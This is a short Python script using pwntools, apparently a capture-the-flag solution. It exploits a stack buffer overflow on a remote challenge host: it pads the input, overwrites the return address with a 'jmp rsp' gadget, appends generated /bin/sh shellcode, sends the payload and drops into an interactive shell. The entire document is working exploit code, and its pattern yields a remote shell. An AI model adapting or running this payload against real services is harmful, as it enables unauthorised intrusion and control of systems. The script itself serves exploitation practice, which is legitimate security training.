from pwn import *
#jmp_8 = b"\xEB\x06"
context.arch = 'amd64'
jmp_rsp = 0x000000000040118d
padding = b'a' * (0x20 + 8)
shellcode = asm(shellcraft.sh())
payload = padding + p64(jmp_rsp) + shellcode
r = remote('simplebufferoverflow.fly.dev', 5000)
r.sendline(payload)
r.interactive()

